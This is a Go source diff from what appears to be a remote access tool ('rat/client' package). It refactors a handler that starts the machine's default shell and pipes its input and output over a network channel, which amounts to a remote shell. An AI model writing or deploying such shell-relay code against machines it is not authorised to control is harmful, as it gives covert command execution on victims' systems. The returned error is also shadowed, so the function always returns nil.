@@ -8,62 +8,51 @@ import (
 	"rat/client/shell"
 )
 
-type ShellPacket struct {
+type ShellChannel struct {
 	Action int    `network:"receive"`
 	Data   string `network:"send,receive"`
 }
 
-var current struct {
-	process *exec.Cmd
-	stdin   io.WriteCloser
-	stdout  io.ReadCloser
-}
+func (packet ShellChannel) Open(channel io.ReadWriteCloser, c *Connection) error {
+	cmd := exec.Command(shell.GetDefault())
+	stdin, _ := cmd.StdinPipe()
+	stdout, _ := cmd.StdoutPipe()
+	cmd.Stderr = cmd.Stdout
+	cmd.Start()
 
-func (packet ShellPacket) Open(channel io.ReadWriteCloser, c *Connection) error {
-	current.process = exec.Command(shell.GetDefault())
-	current.stdin, _ = current.process.StdinPipe()
-	current.stdout, _ = current.process.StdoutPipe()
-	current.process.Stderr = current.process.Stdout
-	current.process.Start()
-
-	current.stdin.Write([]byte("echo hello world\n"))
-
-	defer current.process.Process.Kill()
+	defer cmd.Process.Kill()
 	defer channel.Close()
 
 	go func() {
-		r := bufio.NewReader(current.stdout)
+		r := bufio.NewReader(stdout)
 		b := make([]byte, 1024)
 		for {
 			n, err := r.Read(b)
-			fmt.Println("client > command", n, err, string(b[:n]))
 			if err != nil {
 				break
 			}
 			_, err = channel.Write(b[:n])
 			if err != nil {
-				fmt.Println("failed writing to channel", err)
 				break
 			}
 		}
 	}()
 
+	var err error
 	r := bufio.NewReader(channel)
 	b := make([]byte, 1024)
 	for {
 		n, err := r.Read(b)
-		fmt.Println("command > client", err, string(b[:n]), b[:n])
 		if err != nil {
 			break
 		}
-		_, err = current.stdin.Write(b[:n])
+		_, err = stdin.Write(b[:n])
 		if err != nil {
-			fmt.Println("error writing to process", err)
 			break
 		}
 	}
 
 	fmt.Println("end")
 
-	return nil
+	return err
 }
